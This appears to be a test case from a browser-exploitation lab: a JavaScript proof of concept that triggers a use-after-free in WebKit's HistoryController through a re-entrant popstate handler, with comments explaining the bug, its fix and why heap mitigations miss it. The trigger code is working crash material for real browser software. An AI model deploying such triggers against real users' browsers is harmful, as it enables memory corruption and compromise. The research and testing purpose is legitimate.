// c025: HistoryController UAF via a re-entrant popstate handler (fix efe49205).
//
// popstate runs inside HistoryController::recursiveGoToItem while it still holds pointers into the history
// item graph. Appending frames and forcing GC from that handler frees entries the traversal is still using.
// HistoryController is a plain C++ object, so the IsoHeap segregation that killed the canvas route does not
// apply here.
//
// Adapted from the shipped test: it drives history in a CHILD frame (the original called history.back() on the
// top document, which would navigate the Guide itself away from the lab page).
(function () {
  function send(t) { try { navigator.sendBeacon('/beacon', 'c025-' + t); } catch (e) {} }
  send('boot');

  function churn() {
    if (typeof GCController !== 'undefined') { GCController.collect(); return; }
    for (var i = 0; i < 6000; i++) { var s = new String('A'.repeat(4000)); }
  }

  var f = document.createElement('iframe');
  f.style.display = 'none';
  f.src = 'about:blank';
  document.body.appendChild(f);
  send('iframe-added');

  f.onload = function () {
    var w = f.contentWindow;
    send('loaded');
    try {
      w.addEventListener('popstate', function () {
        for (var i = 0; i < 40; i++) {
          var g = document.createElement('iframe');
          g.src = 'about:blank';
          document.body.appendChild(g);
        }
        churn();
        send('popstate-ran');
      }, { once: true });

      w.history.pushState({ k: 1 }, '', '#x');
      send('pushed');
      setTimeout(function () {
        try { w.history.back(); send('back-called'); }
        catch (e) { send('back-threw:' + e.name); }
      }, 50);
    } catch (e) { send('setup-threw:' + e.name); }
  };

  setTimeout(function () { send('survived'); }, 2500);
})();
